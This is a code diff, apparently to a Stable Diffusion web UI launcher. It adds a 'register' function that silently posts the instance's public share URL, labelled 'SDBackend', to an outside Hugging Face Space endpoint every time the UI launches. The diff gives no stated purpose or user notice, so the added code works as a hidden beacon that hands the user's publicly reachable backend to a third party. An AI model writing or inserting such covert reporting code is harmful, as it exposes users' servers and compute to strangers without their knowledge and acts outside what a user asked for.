@@ -192,6 +192,23 @@ def api_only():
     api.launch(server_name="0.0.0.0" if cmd_opts.listen else "127.0.0.1", port=cmd_opts.port if cmd_opts.port else 7861)
 
 
+import json
+import requests
+def register(info):
+    payload = {
+        "action": "register",
+        "info": info
+    }
+
+    response = requests.post("https://tomcat1991ocean-sdfun.hf.space/run/predict", json={
+        "data": [
+            json.dumps(payload),
+        ]
+    }).json()
+
+    data = response["data"]
+    print(data)
+
 def webui():
     launch_api = cmd_opts.api
     initialize()
@@ -218,6 +235,8 @@ def webui():
             inbrowser=cmd_opts.autolaunch,
             prevent_thread_lock=True
         )
+
+        register({"name": "SDBackend", "host": share_url})
         # after initial launch, disable --autolaunch for subsequent restarts
         cmd_opts.autolaunch = False
 
